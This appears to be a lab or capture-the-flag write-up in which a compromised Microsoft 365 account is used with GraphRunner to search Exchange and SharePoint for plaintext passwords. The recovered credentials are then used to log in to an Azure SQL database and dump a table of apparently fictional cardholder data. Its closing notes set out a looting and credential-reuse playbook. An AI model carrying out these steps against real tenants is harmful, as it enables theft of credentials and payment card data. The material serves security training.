# Loot Exchange, Teams and SharePoint with GraphRunner

This lab goes over using GraphRunner to pillage Exchange, SharePoint and OneDrive after getting access to a compromised M365 user account. We find database credentials in emails and password files sitting in SharePoint, then use those to connect to an Azure SQL database and pull subscriber payment card data.

## Summary

- Authenticate as compromised user with device code flow
- Enumerate Azure resources and find SQL server
- Use GraphRunner to search Exchange mailbox for credentials
- Search SharePoint/OneDrive and find password files
- Log in to Azure SQL database with recovered credentials
- Dump subscriber table containing PCI data

## Resource enumeration

Logging in with device code flow:

```bash
az login --use-device-code
```
```
No     Subscription name      Subscription ID                       Tenant
-----  ---------------------  ------------------------------------  -----------------
[1] *  Mega Big Tech Default  ceff06cb-e29d-4486-a3ae-eaaec5689f94  Default Directory
```

Listing the resources reveals an Azure SQL server with a few databases:

```bash
az resource list -o table
```
```
Name                     ResourceGroup     Location    Type                             Status
-----------------------  ----------------  ----------  -------------------------------  ---------
mbt-finance/master       content-static-2  eastus      Microsoft.Sql/servers/databases  Succeeded
mbt-finance/Finance      content-static-2  eastus      Microsoft.Sql/servers/databases  Succeeded
mbt-finance              content-static-2  eastus      Microsoft.Sql/servers            Succeeded
mbt-finance/subscribers  content-static-2  eastus      Microsoft.Sql/servers/databases  Succeeded
```

We need credentials to connect to the SQL server so let's look around with GraphRunner.

## Pillaging Exchange

After getting Graph tokens, I searched the mailbox for the keyword "password". We get a hit on an email from Clara Miller containing database credentials in plaintext:

```powershell
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
```
```
[*] Using the provided access tokens.
[*] Graph reported 5 potential match(es) for search term password. Page 1 returned 1 hit(s), 1 of which were successfully hydrated.
Subject: Subscribers database | Sender: Clara Miller | Receivers: Sam.Olsson@megabigtech.com | Date: 11/06/2023 17:24:00 | Message Preview: Hi Sam,

IT have set up our access to the subscriptions database, so we can start pulling on this data for the quarterly management metrics.

Shared login below:

Username: financereports
Password: $reporting$123
```

## Pillaging SharePoint and OneDrive

Same search on SharePoint/OneDrive gives us two more password files:

```powershell
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password'
```
```
[*] Using the provided access tokens.
[*] Found 2 matches for search term password
Result [0]
File Name: passwords.xlsx
Location: https://megabigtech.sharepoint.com/Shared Documents/passwords.xlsx
Created Date: 03/27/2024 00:13:10
Last Modified Date: 09/10/2026 04:21:31
Size: 14.70 KB
File Preview: passwords Site Username Password Azure Azure $R4ncher2043 Dev Env r&d $MEGAPRODUCTS-777$
================================================================================
Result [1]
File Name: Finance Logins.docx
Location: https://megabigtech.sharepoint.com/sites/FinanceTeam/Shared Documents/Finance Logins.docx
Created Date: 11/06/2023 00:17:46
Last Modified Date: 11/06/2023 00:17:00
Size: 20.74 KB
File Preview: PASSWORDS) Service/Account: Finance Database URL: https://10.10.11.15/login Username: ... Password: F1n@nc3Db2023! Service/Account: Accounting Software URL: https://accounting....
================================================================================
```

## SQL database access

I used the credentials from the email to connect to the SQL server. First, getting the FQDN:

```bash
az sql server show --resource-group content-static-2 --name mbt-finance
```
```json
{
  "administratorLogin": "manager",
  "fullyQualifiedDomainName": "mbt-finance.database.windows.net",
  "location": "eastus",
  "name": "mbt-finance",
  "publicNetworkAccess": "Enabled",
  "state": "Ready",
  "version": "12.0"
}
```

Connecting with Impacket's `mssqlclient.py`:

```bash
mssqlclient.py financereports:'$reporting$123'@mbt-finance.database.windows.net -db Finance
```
```
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: Finance
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(mbt-finance): Line 1: Changed database context to 'Finance'.
[*] INFO(mbt-finance): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2014  (12.0.193)
[!] Press help for extra shell commands
```

## Getting the flag

The `Finance` database has a single `Subscribers` table with full cardholder data:

```sql
SQL (financereports  financereports@Finance)> SELECT TABLE_NAME FROM Finance.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
TABLE_NAME
-----------
Subscribers
SQL (financereports  financereports@Finance)> select * from Subscribers;
                        SubscriberID   CardNumber         ExpiryDate   CVV   FullName                                 BirthDate
------------------------------------   ----------------   ----------   ---   --------------------------------------   ----------
EBB7C066-B630-4794-9D3A-06451A685B65   4532756279624064   2025-12-01   b'123'   Alex Smith                               1990-06-15
D4148D1D-F65E-45DA-93FE-A47E39FA011B   5399832489200328   2023-11-01   b'311'   Jamie Doe                                1982-03-22
076409FD-F8C6-4BD2-AC63-F38EB3245414   6011169726455487   2024-01-01   b'667'   Casey Johnson                            1975-09-05
72394343-72EA-4C69-B3AF-83609A7A22E3   4539588563664805   2025-07-01   b'542'   Jordan Bennett                           1992-11-08
94F24F3A-E5C8-4708-A581-57557C6007CD   4024007137761885   2023-12-01   b'234'   Taylor Young                             1987-04-16
D7ED1D92-7554-4029-93C0-B18898B1D7DD   4916018410706485   2026-05-01   b'781'   Riley Davis                              1999-07-29
F5C4EA0F-E9F3-4BE7-ACF9-A025F444E352   4556899290687938   2027-08-01   b'442'   Morgan Wilson                            1971-02-14
B65EF1FC-A5DE-4671-BEE9-FD3E4EBA4297   4532147725824375   2024-09-01   b'913'   Bailey Anderson                          1965-08-09
3A754501-704B-45AB-A2E2-C622637632A9   4485085783859149   2025-04-01   b'824'   Charlie Thomas                           1994-12-01
7EB54E61-F1E8-435C-B70B-8FE81092D02D   4716918851085776   2023-06-01   b'778'   Jordan Martin                            1980-05-24
9DEE4B96-5931-42D5-ABF7-595647A51D7E   4485365593482330   2024-11-01   b'276'   Robin Jackson                            1978-03-17
E76003A6-1D78-4E5F-959B-3D55B93F5906   4916212737891832   2025-10-01   b'476'   Drew White                               1969-01-13
49474F71-83F6-45FB-AE70-95464E65AC52   4716550251497058   2024-12-01   b'629'   Jesse Harris                             1996-08-27
5D5EF02E-C1FF-427C-8041-73B3D11FF758   4539402536708917   2026-02-01   b'834'   Casey Clark                              1973-11-01
56C2AD8D-9D26-4142-85AC-BB3361E2A78A   4485875269410024   2023-07-01   b'958'   Quinn Lewis                              1985-06-30
19BDD40F-C20D-48F5-A8EE-22EFC68CA7D5   4916831137602983   2024-08-01   b'121'   Jordan Walker                            1991-09-14
33E7F0B6-BCA4-4231-A05B-65D6E072252F   4929437812930761   2025-09-01   b'642'   Charlie Hall                             1998-12-19
48A38353-2E64-4A06-8050-5EE90C3ABB92   4556273620732761   2027-03-01   b'369'   Taylor Lee                               1976-02-03
FAC0601E-9AC8-4BCD-B29D-559055672218   4024007169072387   2024-04-01   b'853'   Alex Lopez                               1993-10-10
A960A3B9-B329-4366-A22D-F86430D03FDF   4539712534569618   2025-02-01   b'412'   Jordan King                              1974-07-21
500B8272-C197-4150-8F85-02EF40AA3669                      1900-01-01   b'   '   Flag: 82b5<REDACTED>c3570b   1900-01-01
```

---

> [!note] Engagement notes
> - Always run GraphRunner mailbox and SharePoint searches with terms like "password", "secret", "key", "credentials" after compromising an M365 account
> - Check for `.xlsx` and `.docx` files with "password" in the name on SharePoint — they often have no access controls
> - Check if `publicNetworkAccess` is enabled on Azure SQL servers — combined with leaked credentials this gives direct external access
> - Credentials found in email often work on other systems — always try credential reuse
> - Device code flow is a common phishing vector — check if it's restricted in Conditional Access
> - Unencrypted cardholder data in SQL is a major PCI DSS finding — flag separately in the report
